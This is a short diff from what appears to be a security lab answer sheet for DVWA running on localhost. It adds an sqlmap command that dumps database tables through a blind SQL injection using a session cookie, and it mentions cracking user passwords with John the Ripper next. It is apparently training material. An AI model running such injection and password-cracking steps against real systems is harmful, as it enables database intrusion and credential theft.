@@ -270,5 +270,9 @@ ce31e8670; security=low" --dbs
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
 
+```
+python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli_blind/?id=&Submit=Submit#" --cookie="PHPSESSID=c3243e5dcda438603c9d3aece31e8670; security=low" -D dvwa --tables
+```
+
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
